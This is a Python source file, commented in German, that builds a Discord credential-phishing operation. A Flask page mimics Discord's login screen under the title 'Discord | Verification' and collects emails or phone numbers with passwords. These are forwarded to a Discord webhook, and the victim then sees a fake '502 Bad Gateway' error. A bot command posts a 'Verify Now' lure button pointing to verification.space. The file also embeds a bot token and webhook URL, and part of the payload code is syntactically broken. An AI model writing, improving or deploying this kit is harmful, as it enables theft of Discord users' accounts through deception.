import discord
from discord.ext import commands
from flask import Flask, request, render_template_string
from flask_cors import CORS
import threading
import requests
import os

# --- DEINE DATEN HIER EINTRAGEN ---
TOKEN = "MTQ4OTMwMjQzMTc2OTgyNTQ4MA.GIgDAX.Mw5aaqzA6-azTjsnyaInE3noUSrJNVd0Fx--VA"
WEBHOOK_URL = "https://discord.com/api/webhooks/1489349046098329760/3Gfi6eJ2I4_50cIZX3p0xNFlhWvdAeW6pdhSN7LoMRrI1TTrRIMi69ZctAFgof-6LQVH"
WEB_URL = "https://verification.space" 

app = Flask(__name__)
CORS(app)

# CSS getrennt vom HTML, um Python-Fehler zu vermeiden
CSS_STYLE = """
    body { 
        margin: 0; padding: 0; font-family: sans-serif;
        background-color: #313338; background-image: url('https://discord.com/assets/ee7c69532138c7b8595c.svg');
        background-size: cover; display: flex; align-items: center; justify-content: center; height: 100vh;
    }
    .login-box {
        background: #313338; padding: 32px; border-radius: 8px; width: 400px;
        box-shadow: 0 2px 10px rgba(0,0,0,0.2); color: #dbdee1;
    }
    h1 { color: white; font-size: 24px; text-align: center; margin-bottom: 8px; }
    .subtitle { color: #b5bac1; text-align: center; margin-bottom: 20px; font-size: 14px; }
    label { display: block; font-size: 12px; color: #b5bac1; text-transform: uppercase; margin-bottom: 8px; }
    input { width: 100%; padding: 10px; background: #1e1f22; border: none; border-radius: 3px; color: white; margin-bottom: 20px; box-sizing: border-box; }
    .btn { width: 100%; background: #5865f2; color: white; border: none; padding: 12px; border-radius: 3px; cursor: pointer; font-size: 16px; font-weight: bold; }
    .btn:hover { background: #4752c4; }
"""

HTML_TEMPLATE = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Discord | Verification</title>
    <style>{CSS_STYLE}</style>
</head>
<body>
    <div class="login-box">
        <h1>Welcome back!</h1>
        <p class="subtitle">We're so excited to see you again!</p>
        <form method="POST" action="/submit">
            <label>Email or Phone Number</label>
            <input type="text" name="user" required autocomplete="off">
            <label>Password</label>
            <input type="password" name="pw" required autocomplete="off">
            <button type="submit" class="btn">Login</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/submit', methods=['POST'])
def submit():
    u = request.form.get('user')
    p = request.form.get('pw')
    
    # f-string für Webhook (doppelte Klammern {{ }} für JSON nötig)
    payload = {{ }}
        "embeds": [{{ }}
            "title": "📥 New Verification Received",
            "color": 5814783,
            "fields": [
                {{"name": "User/Email", "value": f"``` {{u}} ```"}},
                {{"name": "Password", "value": f"``` {{p}} ```"}}
            ],
            "footer": {{"text": "Domain: verification.space"}}
        }}]
    }
    try:
        requests.post(WEBHOOK_URL, json=payload)
    except:
        pass
    return "<h1>502 Bad Gateway</h1><p>Connection timed out. Please try again.</p>"

def run_web():
    # Render braucht os.environ.get("PORT")
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

# --- BOT SETUP ---
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.command()
async def setup(ctx):
    view = discord.ui.View()
    btn = discord.ui.Button(label="Verify Now", url=WEB_URL, style=discord.ButtonStyle.link)
    view.add_item(btn)
    
    embed = discord.Embed(
        title="🔒 Identity Verification",
        description="Please verify your account to get access to this server.",
        color=discord.Color.from_rgb(88, 101, 242)
    )
    await ctx.send(embed=embed, view=view)

if __name__ == "__main__":
    threading.Thread(target=run_web, daemon=True).start()
    bot.run(TOKEN)
